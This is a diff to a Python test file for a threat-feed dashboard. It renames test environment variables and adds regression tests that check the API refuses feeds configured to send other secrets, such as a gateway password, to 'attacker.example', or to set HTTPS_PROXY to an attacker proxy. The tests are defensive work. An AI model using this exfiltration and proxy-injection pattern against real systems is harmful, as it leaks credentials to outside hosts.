@@ -487,7 +487,7 @@ def test_api_key_set_status_clear_and_never_echoed(client):
     """Dashboard-saved API keys: written to the data-volume .env, exported to
     the process env immediately, reported only as configured true/false."""
     from threatfeedme import core
-    var = "TEST_KEYED_FEED_KEY"
+    var = "TFM_FEED_TEST_KEYED"
     r = client.post("/api/feeds", json={
         "name": "keyed_feed", "url": "https://example.com/keyed.txt",
         "feed_type": "threat_intel", "requires_auth": True,
@@ -712,16 +712,16 @@ def test_multivar_api_key_set_status_and_gate(client, monkeypatch):
     are refused so the endpoint can't become a generic env editor."""
     from threatfeedme import dashboard
     from threatfeedme.models import FeedSource, FeedType
-    monkeypatch.delenv("HD_TEST_ID", raising=False)
-    monkeypatch.delenv("HD_TEST_KEY", raising=False)
+    monkeypatch.delenv("TFM_FEED_HD_TEST_ID", raising=False)
+    monkeypatch.delenv("TFM_FEED_HD_TEST_KEY", raising=False)
     dashboard.db.add_feed(FeedSource(
         name="multikey_feed", url="https://example.com/api", weight=1.0,
         feed_type=FeedType.THREAT_INTEL, update_interval=3600,
-        requires_auth=True, auth_env="HD_TEST_ID,HD_TEST_KEY", enabled=False))
+        requires_auth=True, auth_env="TFM_FEED_HD_TEST_ID,TFM_FEED_HD_TEST_KEY", enabled=False))
     try:
         j = client.get("/api/feeds/multikey_feed/api-key").json()
         assert j["configured"] is False
-        assert [v["name"] for v in j["vars"]] == ["HD_TEST_ID", "HD_TEST_KEY"]
+        assert [v["name"] for v in j["vars"]] == ["TFM_FEED_HD_TEST_ID", "TFM_FEED_HD_TEST_KEY"]
 
         # plain api_key is ambiguous for a two-var feed
         r = client.post("/api/feeds/multikey_feed/api-key", json={"api_key": "x"})
@@ -734,19 +734,58 @@ def test_multivar_api_key_set_status_and_gate(client, monkeypatch):
 
         # setting both configures the feed; values are never echoed back
         r = client.post("/api/feeds/multikey_feed/api-key",
-                        json={"keys": {"HD_TEST_ID": "id-1", "HD_TEST_KEY": "k-2"}})
+                        json={"keys": {"TFM_FEED_HD_TEST_ID": "id-1", "TFM_FEED_HD_TEST_KEY": "k-2"}})
         assert r.status_code == 200 and r.json()["configured"] is True
         assert "id-1" not in r.text and "k-2" not in r.text
-        assert os.environ["HD_TEST_ID"] == "id-1"
+        assert os.environ["TFM_FEED_HD_TEST_ID"] == "id-1"
 
         # partial credentials -> not configured (badge must not lie)
         r = client.post("/api/feeds/multikey_feed/api-key",
-                        json={"keys": {"HD_TEST_KEY": ""}})
+                        json={"keys": {"TFM_FEED_HD_TEST_KEY": ""}})
         assert r.json()["configured"] is False
     finally:
         client.delete("/api/feeds/multikey_feed")
-        for v in ("HD_TEST_ID", "HD_TEST_KEY"):
+        for v in ("TFM_FEED_HD_TEST_ID", "TFM_FEED_HD_TEST_KEY"):
             os.environ.pop(v, None)
+
+
+# NOTE: tests that reach the DB via `dashboard.db` must stay ABOVE the tests
+# that reload the threatfeedme modules (the csrf fixtures): after a reload,
+# `dashboard.db` is the new modules' DB while `client` still serves the old.
+
+@pytest.mark.parametrize("secret", ["UNIFI_PASSWORD", "DASHBOARD_PASSWORD", "HTTPS_PROXY"])
+def test_add_feed_refuses_someone_elses_secret_as_its_key(client, secret):
+    """auth_env names the variable whose VALUE is sent as the feed's key, so a
+    feed pointed at an attacker's server with auth_env=UNIFI_PASSWORD used to
+    hand over the gateway password on the next refresh (review 2026-09-22)."""
+    r = client.post("/api/feeds", json={
+        "name": "exfil_feed", "url": "https://attacker.example/x.txt",
+        "feed_type": "threat_intel", "requires_auth": True,
+        "auth_env": secret, "auth_header": "X-Leak",
+    })
+    assert r.status_code == 400, r.text
+    assert "TFM_FEED_" in r.json()["detail"]
+    assert client.get("/api/feeds/exfil_feed/api-key").status_code == 404
+
+
+def test_api_key_endpoint_refuses_a_stored_process_knob(client):
+    """A feed stored before the rule with auth_env=HTTPS_PROXY must not turn
+    the key endpoint into a proxy injection for every outbound request."""
+    from threatfeedme import dashboard
+    from threatfeedme.models import FeedSource, FeedType
+    os.environ.pop("HTTPS_PROXY", None)
+    dashboard.db.add_feed(FeedSource(
+        name="legacy_bad_feed", url="https://example.com/x", weight=1.0,
+        feed_type=FeedType.THREAT_INTEL, update_interval=3600,
+        requires_auth=True, auth_env="HTTPS_PROXY", enabled=False))
+    try:
+        r = client.post("/api/feeds/legacy_bad_feed/api-key",
+                        json={"api_key": "http://attacker:3128"})
+        assert r.status_code == 400
+        assert "HTTPS_PROXY" not in os.environ
+    finally:
+        client.delete("/api/feeds/legacy_bad_feed")
+        os.environ.pop("HTTPS_PROXY", None)
 
 
 def test_ops_pulse_row(client):
